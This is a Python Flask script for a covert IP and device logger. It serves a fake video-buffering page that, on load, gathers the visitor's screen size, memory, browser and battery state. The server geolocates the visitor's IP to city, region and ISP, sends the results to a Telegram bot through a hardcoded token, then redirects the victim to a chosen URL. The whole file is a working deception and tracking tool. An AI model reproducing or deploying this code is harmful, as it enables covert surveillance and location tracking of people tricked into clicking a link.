import requests
import datetime
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# --- CONFIGURATION ---
TOKEN = "8335838796:AAHnE-KQbmJcZOo_mKgM4XxQPdIMUKihtH0"
ID = "8335838796"

@app.route('/', methods=['GET', 'POST'])
def handler():
    if request.method == 'GET':
        target = request.args.get('url', 'https://www.youtube.com')
        
        html_code = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Video Loading...</title>
            <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        </head>
        <body style="background:#000; color:#fff; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
            <div style="border:5px solid #f3f3f3; border-top:5px solid #00ff00; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite;"></div>
            <p style="margin-top:20px; font-weight:bold;">Buffering Content... Please Wait</p>
            <style>@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }</style>
            
            <script>
                async function captureAndForward() {
                    try {
                        let battery = await navigator.getBattery();
                        let info = {
                            w: window.screen.width,
                            h: window.screen.height,
                            ram: navigator.deviceMemory || "Unknown",
                            ua: navigator.userAgent,
                            bat: Math.round(battery.level * 100) + "%",
                            char: battery.charging ? "Charging" : "Discharging",
                            target: "{{ target }}"
                        };
                        
                        $.ajax({
                            url: '/',
                            type: 'POST',
                            contentType: 'application/json',
                            data: JSON.stringify(info),
                            complete: function() { 
                                setTimeout(() => { window.location.href = "{{ target }}"; }, 500);
                            }
                        });
                    } catch (e) { window.location.href = "{{ target }}"; }
                }
                window.onload = captureAndForward;
            </script>
        </body>
        </html>
        """
        return render_template_string(html_code, target=target)

    if request.method == 'POST':
        data = request.json
        ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
        
        try:
            geo = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
        except:
            geo = {}

        msg = f"""
🔥 *NEW DEVICE INFORMATION* 🔥

*🌐 IP Information:*
• IP Address: `{ip}`
• City: `{geo.get('city', 'Unknown')}`
• Region: `{geo.get('regionName', 'Unknown')}`
• Country: `{geo.get('countryCode', 'Unknown')}`
• ISP: `{geo.get('isp', 'Unknown')}`
• Time Zone: `{geo.get('timezone', 'Unknown')}`
• Current Time: {datetime.datetime.now().strftime('%d %B %Y, %I:%M %p')}

*📱 Device Information:*
• Battery Percentage: {data.get('bat')}
• Charging Status: {data.get('char')}
• Memory: {data.get('ram')} GB
• Browser: `{data.get('ua')[:60]}...`
• Screen Resolution: {data.get('w')}x{data.get('h')}
• Touch Support: Supported

*Information Captured By:* @JSOrganization
        """
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      data={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
        return jsonify({"status": "ok"})

# Vercel এর জন্য এটি যোগ করা হয়েছে
if __name__ == "__main__":
    app.run()
